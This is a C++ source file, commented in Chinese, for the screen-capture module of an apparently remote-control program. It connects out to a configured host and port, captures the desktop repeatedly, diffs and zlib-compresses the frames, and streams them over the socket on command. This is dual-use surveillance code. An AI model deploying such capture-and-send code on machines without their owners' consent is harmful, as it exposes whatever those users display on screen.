#include "ScreenManage.h"
#include <stdio.h>
#include "ConnectInfo.h"
#include "./zlib.h"
#pragma comment(lib,"./zlib.lib")	//图象无损数据压缩使用zlib库函数

int g_ScreenBits;//图像的位数

CScreenManage::CScreenManage(void)
{
	g_ScreenBits = 8;
}


CScreenManage::~CScreenManage(void)
{

}




DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
{
	/* DWORD *pParam   =   (DWORD   *)lparam; 
	CScreenManage Screen;
	Screen.m_MainSocket = *pParam;
	SOCKET MainSocket = Screen.m_MainSocket;
	*/
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		closesocket(MainSocket);
		return 0;//connect error
	}

	//================================================================================
	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //数据交换区 1.5MB

	//send socket type 
	msgHead.dwCmd = CMD_SCREENDLG_SHOW;
	msgHead.dwSize = 0;
	if(!SendMsg(MainSocket, NULL, &msgHead))
	{
		if(chBuffer != NULL)
			delete []chBuffer;
		return 0; 
	}
	// ::MessageBox(NULL, "第一个while(1)前没有崩溃", "DD", MB_OK);
	while(1)
	{
		//接收命令
		if(!RecvMsg(MainSocket, chBuffer, &msgHead))
			break;

		//解析命令
		switch(msgHead.dwCmd)
		{
		case CMD_GETFIRST_SCREEN://请求获取屏幕信息
			{
				//::MessageBox(NULL, "正在创建bmp图像","",MB_OK);
				//以下为屏幕信息的获取 ，一直获取并发送。
				DWORD *pDWORD = new DWORD;
				*pDWORD = MainSocket;
				g_ScreenBits = msgHead.dwExtend1;
				CreateThread(NULL, NULL, SendScreen, pDWORD, NULL, NULL);

				break;
			}
		case CMD_CHANGE_SCREEN_BITS:
			{
				g_ScreenBits = msgHead.dwExtend1;
				break;
			}

		default:
			{
				::MessageBox(NULL, "不好意思，screen收到不能理解消息","", MB_OK);
				break;
			} 
		}
		//char str[111];
		//if(!SendMsg(MainSocket, chBuffer, &msgHead))//MSGHEAD 为7
		//	break;
	}


	if(chBuffer != NULL)
		delete[] chBuffer;
	closesocket(MainSocket);
	return 0;
}





DWORD __stdcall SendScreen(LPVOID lparam)//线程处理屏幕传输
{

	DWORD *pParam   =   (DWORD   *)lparam; 
	SOCKET MainSocket =*pParam; 
	DWORD dwLastSend;

	int ScreenBits = 0;
	BYTE * pLastData = new BYTE [2048 * 1536 *3 * 2];//为分辨率2048 * 1536 且位为24位即3个字节的大小的 2倍  
	BYTE * pChanged = new BYTE [2048 *1536 * 3 * 2];

	HWND hWnd = GetDesktopWindow();//获得屏幕的HWND.
	HDC hScreenDC = GetDC(hWnd);   //获得屏幕的HDC.

	RECT rect; 
	//该函数返回指定窗口的边框矩形的尺寸。该尺寸以相对于屏幕坐标左上角的屏幕坐标给出。
	GetWindowRect(hWnd,&rect);
	SIZE screensize;
	screensize.cx=rect.right-rect.left;
	screensize.cy=rect.bottom-rect.top;
	//CreateCompatibleBitmap该函数创建与指定的设备hScreenDC环境相关的设备兼容的位图。
	HBITMAP hBitmap = ::CreateCompatibleBitmap(hScreenDC,screensize.cx,screensize.cy);

	HDC MemDC = CreateCompatibleDC(hScreenDC);//当前屏幕的DC

	BOOL  IsFirst = TRUE;

	memset(pLastData, 0, 2048 * 1536 *3 * 2);


	while(1)
	{

		if(ScreenBits != g_ScreenBits)
		{
			ScreenBits = g_ScreenBits;
			IsFirst = TRUE;
		}
		HWND hWnd = GetDesktopWindow(); 
		GetWindowRect(hWnd,&rect);
		int ChangedSize = 0;//改变了的数据的大小

		//将屏幕图像传送到MemDC中的位图。
		HGDIOBJ hOldBMP = ::SelectObject(MemDC,hBitmap);
		::BitBlt(MemDC,0,0,screensize.cx,screensize.cy,hScreenDC,rect.left,rect.top,SRCCOPY);
		::SelectObject(MemDC,hOldBMP);
		/*********将位图INFOHEADER ，（调色板），图像数据 放入pData***********************/
		dwLastSend = GetTickCount();
		HDC hDC =::CreateDC("DISPLAY",NULL,NULL,NULL);
		int iBits = ::GetDeviceCaps(hDC, BITSPIXEL) * ::GetDeviceCaps(hDC, PLANES);//当前分辨率下每个像素所占字节数
		::DeleteDC(hDC);

		DWORD   dwPaletteSize=0;	//调色板大小， 位图中像素字节大小 
		if (ScreenBits<= 8)		
			dwPaletteSize = (1 <<  ScreenBits) *	sizeof(RGBQUAD);	

		BITMAP  bm;        //位图属性结构
		::GetObject(hBitmap, sizeof(bm), (LPSTR)&bm);

		BITMAPINFOHEADER   bi;       //位图信息头结构     
		bi.biSize            = sizeof(BITMAPINFOHEADER);  
		bi.biWidth           = bm.bmWidth;
		bi.biHeight          = bm.bmHeight;
		bi.biPlanes          = 1;
		bi.biBitCount        = ScreenBits;
		bi.biCompression     = BI_RGB; //BI_RGB表示位图没有压缩
		bi.biSizeImage       = 0;
		bi.biXPelsPerMeter   = 0;
		bi.biYPelsPerMeter   = 0;
		bi.biClrUsed         = 0;
		bi.biClrImportant    = 0;

		DWORD dwBmBitsSize = ((bm.bmWidth *  ScreenBits+31)/32) * 4 * bm.bmHeight;//位图数据的大小

		int DataPalInfoSize = dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER);//位图除了FILEHDEAR外  其它3部分大小的和

		//	HANDLE hDib = ::GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  //1为位图内容分配内存  
		LPBITMAPINFOHEADER pData = (LPBITMAPINFOHEADER)new BYTE [DataPalInfoSize];  //2
		//LPBITMAPINFOHEADER pData = (LPBITMAPINFOHEADER)GlobalLock(hDib);  //new BYTE [DataPalInfoSize];//3
		*pData = bi;//2
		HANDLE hPal = ::GetStockObject(DEFAULT_PALETTE);  // 处理调色板 
		HANDLE  hOldPal=NULL; 
		if (hPal) 
		{
			hDC = ::GetDC(NULL);
			hOldPal = SelectPalette(hDC,(HPALETTE)hPal, FALSE);
			RealizePalette(hDC);
		}
		//将数据保存在指针(LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize指向的位置
		//::GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,(LPSTR)pData + sizeof(BITMAPINFOHEADER)+dwPaletteSize,(LPBITMAPINFO)&bi,DIB_RGB_COLORS);// 获取该调色板下新的像素值
		::GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,(LPSTR)pData + sizeof(BITMAPINFOHEADER)+dwPaletteSize,(BITMAPINFO*)pData,DIB_RGB_COLORS);// 获取该调色板下新的像素值

		//将文件信息头保存到bi
		bi = *pData;
		int DataSize = bi.biSizeImage;//位图中数据的字节数  仅仅是数据
		//memcpy(pData, &bi, sizeof(bi));
		if (hOldPal)//恢复调色板
		{
			SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
			RealizePalette(hDC);
			::ReleaseDC(NULL, hDC);
		}	
		//(BITMAPINFO*)pData
		/****************************比较得到变化的数据***********************************/



		BYTE *p1, *p2;
		int OneLineByte = DataSize / bm.bmHeight;  //一行的字节数
		BYTE *NowScreenOff = (BYTE*)pData + sizeof(BITMAPINFOHEADER)+dwPaletteSize;
		BYTE *LastScreenOff = pLastData + sizeof(BITMAPINFOHEADER)+dwPaletteSize;
		if(!IsFirst)
		{

			rect.top = 99999; rect.left = 99999; rect.bottom = -99999; rect.right = -99999; 

			for(int i = 0; i< bm.bmHeight ; i += 5)//没相隔5行 检测一行数据  注意这里单位是像素
			{
				for(int j = 0; j < OneLineByte; j += 2)//bm.bmWidthBytes一行的字节数 
				{
					p1 = (BYTE*)(NowScreenOff + i * OneLineByte + j);
					p2 = (BYTE*)(LastScreenOff + i * OneLineByte + j);
					if(*p1 != *p2)
					{
						if(rect.top > i)
						{ 
							rect.top = i;
							rect.top =  rect.top > 5 ? (rect.top - 5) : 0; 
						}
						if(rect.bottom < i)
						{
							rect.bottom = i;
							if( i+ 5 >= bm.bmHeight) rect.bottom = bm.bmHeight -1;
						}

						//j / (g_ScreenBits/8) 为j字节所在的像素点的编号  left应稍微靠前些 让差异矩阵稍微大点更精确 所以-2 
						if(rect.left > (j-2) * 8 /ScreenBits )//其实是(j-2) / (ScreenBits/8)) 
						{
							rect.left = (j-2) * 8 /ScreenBits;
							if(rect.left < 0) rect.left = 0;
						}
						//left稍微靠后些好 所以不减2 而且加1个像素 注意是像素 rect里存的是像素
						if(rect.right < j * 8 /ScreenBits + 1)//其实是j/(ScreenBits/8) +1)
						{
							rect.right = j * 8 /ScreenBits + 1;
							if(rect.right >= bm.bmWidth) rect.right = bm.bmWidth - 1;
						}


					}

				}
			}
			//上面计算的不是很精准  在下面这几句稍微扩大下范围 
			rect.top = rect.top - 5;
			if(rect.top < 0) rect.top =0;
			rect.bottom += 5;
			if(rect.bottom >= bm.bmHeight) rect.bottom = bm.bmHeight -1;
			rect.left -= 5;
			if(rect.left < 0) rect.left =0;
			rect.right += 5;
			if(rect.right >= bm.bmWidth) rect.right = bm.bmWidth - 1;

			//保存bmp信息头 调色板 以及 变化区域的大小和数据到pChanged
			memcpy(pChanged, pData, sizeof(BITMAPINFOHEADER)+dwPaletteSize);
			ChangedSize = sizeof(BITMAPINFOHEADER)+dwPaletteSize;
			memcpy(pChanged + ChangedSize, &rect, sizeof(rect));
			ChangedSize += sizeof(rect);
			BYTE *Dst, *Src;
			int BitSz;
			BitSz = (rect.right - rect.left + 1) * ScreenBits / 8;
			for(int i = rect.top; i <= rect.bottom  ; i++) 
			{
				Dst = pChanged + ChangedSize;
				Src = NowScreenOff + i * OneLineByte + rect.left * ScreenBits / 8;
				memcpy(Dst, Src, BitSz);//保存每一行变化的数据
				ChangedSize += BitSz;
			}
			//一切处理完毕后 保存此帧的图像用于与下一帧进行比较
			memcpy(pLastData, pData, DataPalInfoSize); //将数据保存到pLastData
		}


		/*************************发送信息******************************/
		BITMAPFILEHEADER   bmfHdr; //位图文件头结构     
		bmfHdr.bfType = 0x4D42;  // "BM"  	// 设置位图文件头
		DWORD dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;  
		bmfHdr.bfSize = dwDIBSize;
		bmfHdr.bfReserved1 = 0;
		bmfHdr.bfReserved2 = 0;
		bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

		//压缩到pDataCompressd
		DWORD CompressdSize;
		BYTE* pDataCompressd;
		if(!IsFirst)
		{
			CompressdSize = compressBound(ChangedSize); // 压缩后的长度是不会超过CompressdSize  
			pDataCompressd = new BYTE [CompressdSize];
			pDataCompressd[0] = IsFirst;
			compress(pDataCompressd + 1, &CompressdSize, (BYTE*)pChanged, ChangedSize);
		}
		else
		{
			CompressdSize = compressBound(DataPalInfoSize); // 压缩后的长度是不会超过CompressdSize  
			pDataCompressd = new BYTE [CompressdSize];
			pDataCompressd[0] = IsFirst;
			compress(pDataCompressd + 1, &CompressdSize, (BYTE*)pData, DataPalInfoSize);		 
		}
		MsgHead MsgSend;
		MsgSend.dwCmd = CMD_SCREEN_TO_SHOW;
		MsgSend.dwSize = CompressdSize + 1;
		MsgSend.dwExtend1 = bmfHdr.bfSize;
		MsgSend.dwExtend2 = bmfHdr.bfOffBits;
		if(!SendMsg(MainSocket, (char*)pDataCompressd, &MsgSend))
		{
			::DeleteObject(MemDC);
			::ReleaseDC(hWnd,hScreenDC);
			DeleteObject(hBitmap);

			delete [] pLastData;
			delete [] pDataCompressd;
			delete [] pData;
			delete [] pChanged;
			//::MessageBox(NULL, "发送失败","",MB_OK);
			return 0;
		}
		IsFirst = FALSE;

		delete [] pDataCompressd;
		delete [] pData;
		if ((GetTickCount() - dwLastSend) < 110)
			Sleep(100);

	}

	return 0;
}


